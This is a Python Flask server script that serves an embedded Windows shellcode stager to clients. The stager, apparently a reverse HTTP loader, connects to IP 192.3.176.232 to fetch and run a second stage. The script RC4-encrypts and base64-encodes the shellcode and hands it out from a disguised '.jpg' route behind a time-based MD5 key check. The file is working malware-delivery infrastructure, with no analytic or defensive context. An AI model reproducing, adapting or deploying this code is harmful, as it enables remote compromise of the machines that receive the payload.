#coding:utf-8
from arc4 import ARC4
import base64
import time
from flask import *
import hashlib

import random
import string
app = Flask(__name__)
# length: 835 bytes
buf = b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\xe8\x00\x00\x00\x00\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\xa4\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x36\x0d\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\x50\xe9\x8c\x00\x00\x00\x5b\x31\xd2\x52\x68\x00\x32\xc0\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x5f\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xca\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x75\x07\x58\x50\xe9\x7b\xff\xff\xff\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x6f\xff\xff\xff\x2f\x4d\x47\x6f\x59\x00\xe9\xed\x33\x62\xc7\x3e\xc4\x7c\x72\x4d\x0d\x35\xbd\x9e\x97\x0c\xe0\x0c\x07\x73\x85\xf9\x0b\xde\xdf\x98\xba\x84\xf4\x19\x2a\x28\x80\x9c\x83\x4a\x06\xb3\x23\x64\x66\x10\xae\x66\x73\x0f\x9c\x59\x9a\x70\x9e\x56\x98\x2e\xe5\x87\x19\x7c\xfe\xe9\xf8\x7c\xa7\x19\x7b\xb5\x0a\xc3\xb7\x07\x28\xb1\xca\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x71\x64\x65\x73\x6b\x20\x32\x2e\x34\x2e\x31\x32\x36\x33\x2e\x32\x30\x33\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\xa1\x05\x58\x57\xfb\xa4\xb3\x75\x3d\xf4\x36\x33\x24\x56\xeb\xf7\x08\xa2\x04\x79\xb7\x14\x3d\xb4\xbf\xe4\x26\x39\x1e\xe3\xf8\x1b\xdf\xe4\x54\xf0\xad\xae\x3b\x5e\xc0\xe0\x87\x9f\x5a\x5a\xd1\x90\x08\xdf\xc0\xa6\x7f\x62\x56\x4f\xe7\x78\x22\x9a\x54\xef\xaf\x68\x1c\x93\x2d\x4f\x62\x68\x42\x54\x1c\x87\xf4\x2f\x40\x03\x04\xde\x6a\xca\xbc\x77\x54\xe3\x2d\x7d\xdb\x54\x89\x6a\xe8\xfd\x18\x2e\x08\x7c\x04\xfc\x27\xb1\x21\x77\x5a\x13\xd0\x93\xfc\xbd\x73\x08\x17\x9f\xe1\xdb\xbc\x06\x62\xc9\xc7\x5b\xc5\xdc\x76\x9c\x62\x09\x45\x5e\x95\x6b\xed\x2b\x77\x2d\x24\x09\x1c\x33\x73\x19\x8e\x0e\x61\x49\x32\xae\x5b\xbb\x23\x15\xbf\x34\xfd\x67\x89\x67\x55\x7f\xbc\xd1\xa3\x13\x5c\x61\xbb\xe2\x6e\x1b\x63\x9d\x87\x22\x05\x99\x82\x55\x3c\x88\x71\xb3\xea\x25\xf9\xd6\xa7\x71\x06\x30\x66\x2b\x81\x46\x3a\x81\xd1\x0b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x89\xfd\xff\xff\x31\x39\x32\x2e\x33\x2e\x31\x37\x36\x2e\x32\x33\x32\x00\x6f\xaa\x51\xc3"
buf2 = "test"
obs = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd"
keys = [int(time.time()),''.join(random.sample(string.ascii_letters + string.digits, 32))]
@app.route('/<key>')
def Center(key):

    t = time.time()
    t = int(int(t) / 100)
    hl = hashlib.md5()
    hl.update((obs+str(t)).encode(encoding='utf-8'))
    md5 = hl.hexdigest()
    if key ==md5:
        global keys
        print(int(time.time()),keys[0])
        if int(time.time())-keys[0] >= 10:
            salt = ''.join(random.sample(string.ascii_letters + string.digits, 32))
            print(salt)
            keys[1] = salt
            keys[0]=int(time.time())
        print(keys)
        return keys[1]
    elif key==str(int(int(time.time()) / 10))+".jpg":

        arc4 = ARC4(keys[1])
        enc = arc4.encrypt(buf)
        b64 =  base64.b64encode(enc)
        arc3 = ARC4(keys[1])
        dec = arc3.decrypt(enc)
        print(buf)
        print(dec)
        return b64.decode()
    return "nothing"
@app.route("/test/test")
def test():
    
    return ""
#encrypted = encrypt(buf, key)
if __name__ == '__main__':
    #arc4 = ARC4("keyaaaaaa")
    #enc = arc4.encrypt("test")
    a=""
    for i in range(len(buf)):
        a+=str(buf[i])
        a+=" "
    print(a)
    app.run(host="127.0.0.1",port=80)
